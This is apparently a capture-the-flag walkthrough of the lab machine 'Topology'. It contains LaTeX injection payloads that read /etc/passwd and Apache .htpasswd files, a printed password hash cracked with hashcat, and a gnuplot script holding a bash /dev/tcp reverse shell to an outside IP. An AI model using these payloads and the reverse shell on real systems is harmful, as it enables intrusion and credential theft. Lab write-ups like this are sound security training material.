
**IP Address: 10.129.173.197**

## Recon

#Nmap 

```bash
nmap -T4 -sV -sC -p- -oA targetScan 10.129.173.197
```

###   Findings:

| Port  | Service  | Version             |
| ----- | -------- | ------------------- |
| 22    | SSH      | OpenSSH 8.2p1       |
| 80    | HTTP     | Apache httpd 2.4.41 |

Port 22 is open for ssh 
Port 80 is open for http
    Need to look at the website to see if anything is there

![[Images/Topology/homePage.png]]

The web page seems to be the website for a university of the topology group
There are a few links on the web page but it seems that only one of them actually works and the rest take you back to the home page of the site

The link that works is:
    latex.topology.htb

I added this to my /etc/hosts file and got to the page

![[latexHomepage.png]]

## Enumeration

###    Findings:

The page says that it is a page that will allow you to put an equation into the box and then output a png that you can save

![[latexEquation.png]]

When you add anything to the text box and hit generate it makes a png of what you entered
    If you look at the URL it puts variables in the URL to generate the png
        eqn= & submit=

Looking into the LaTeX language I was able to find some commands that the LaTeX  language has built in to use

Trying some commands that I found I was able to get different responses from the website
    doing the backslash today command I was able to output today's date
    trying other commands to do RCE I got an illegal command error

![[todayLatex.png]]

![[illegalCommand.png]]

After doing some research on the LaTeX markup language, I was able to find some different injection methods that work in this text field
    https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection

I was able to find the the site is using a package called listings by reviewing the files in the base directory of latex.topology.htb and finding the header.tex file

Using this listings package and the hack tricks page I was able to craft a usable injection for the page

```latex
$\lstinputlisting{/etc/passwd}$
```

This command returned an image of the passwd file and let us know what users where on this machine

![[Images/Topology/passwdFile.png]]

Looking over the image I was able to find the one real user on the machine
    vdaisley

After finding this I tried to find more files on the server that would be helpful, but I was not able to find anything to help me find any way onto the machine

I was able to find the exact location that I am on the server at this page
    /var/www/latex 
I looked for the config file and the passwd file here and in just www but I did not get a response back

## Recon

###   Findings:

At this point I have decided to go back to do some recon and see if there is anything else that I can find

I decided to do some virtual host fuzzing to try and find some more subdomains since we know that there is one here already, there may be more to find that are just not advertised yet since the university has some software that are still in progress

#Ffuf 

```bash
sudo ffuf -v -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://topology.htb -H "Host: FUZZ.topology.htb" -fs 6767
```

This returned two results
    stats
    dev

![[ffufSubdomains.png]]

Stats is a common page for sites to have and is something that is a default page, however, dev might have something for us even though it is giving a 401 error

Navigating to the page is giving a login pop up

![[devLogin.png]]

## Enumeration

###    Findings:

We could try and brute force this, but now that we have another page directory I can search it for password files and config files with the injection technique

In order to find the password file for this site I had to search for what the configuration file for Apache web pages/servers are
    There are two different default file names depending on the version of Apache that is running
        httpd.conf or apache2.conf 

The default location of the server configuration is /etc/apache2/{filename}
    in this case the file name is apache2.conf

Using the LFI in the LaTeX equation generator I was able to read the file from the server

```LaTeX
$\lstinputlisting{/etc/apache2/apache2.conf}$
```

![[apacheConfigFile.png]]

In this file there is a variable that is called "AccessFileName" and this is the variable that sets what file Apache will look for in each page's directory to look for to find more configuration information for that specific page

Reading this file will give us more info on how the dev page is set up 
    In this case we are wanting to find information on how the login page is working

```LaTeX
$\lstinputlisting{/var/www/dev/.htaccess}$
```

![[htaccessFile.png]]

Reading this file gave me the variable "AuthUserFile" which tells the page where the user authentication file is inside of the page directory
    The file is set to /var/www/dev/.htpasswd

Now to read this file we should hopefully get a username and a hashed password that I can use to login to this page with

```latex
$\lstinputlisting{/var/www/dev/.htpasswd}$
```

This injection returned and image of a username and hashed password for vdaisley that I may be able to use to login to this dev page
    vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0

![[htppasdFile.png]]

Using hash-identifier, I was able to find that this is an MD5(APR) hash and now I can try and crack this hash to get the password

Using hashcat, I was able to get the clear text value of the password 

```bash
hashcat -a 0 hashes.hash /usr/share/wordlists/rockyou.txt
```

![[crackedHash.png]]

Using this username and password combo that I have found I was able to get logged in to the dev site

![[devHomepage.png]]

Now that I know that these credentials work, I was able to use them to get logged in to the machine through ssh

![[sshLogin.png]]

Now that I am logged in I am able to get the flag for this user 

![[Images/Topology/userFlag.png]]

## Privilege Escalation 

Now that I am on the machine I need to figure out what privileges I have and how to get to root.
###   Findings:

Running sudo -l told me that I am not allowed to run sudo on this machine

Running linpeas did not find anything interesting that I had not already found

#pspy

Running pspy returned something interesting on the system

```bash
./pspy64
```

![[pspyOutput.png]]

This is saying that there is a job running that looks for all files with the extension "plt" in the folder /opt/gnuplot and then runs those files

Going to the folder I was able to CD into it, but trying to LS it told me that I did not have the right privileges to do that but I can write into it

After doing some research on what gnuplot is, I was able to find that it is a Linux command line utility that is used to create 2D and 3D graphs that uses plt files to run the things

Doing some digging on how to use it to break it, I was able to find a site that had a way to run system commands through it
    https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/gnuplot-privilege-escalation/

This shows that by running system commands through it you can interact with the shell as whoever is running the script and since we know that root is running all of them every little bit we can write a script to get a root shell

```gnuplot
system "whoami"

# Reverse shell
system "bash -c 'bash -i >& /dev/tcp/10.10.14.100/4444 0>&1'"
```

I then place this script into the /opt/gnuplot directory and started a listener on my machine then waited for the system to run the script and give me my root shell

```bash
cp revShell.plt /opt/gnuplot
```
```bash
nc -lvnp 4444
```

![[rootShell.png]]

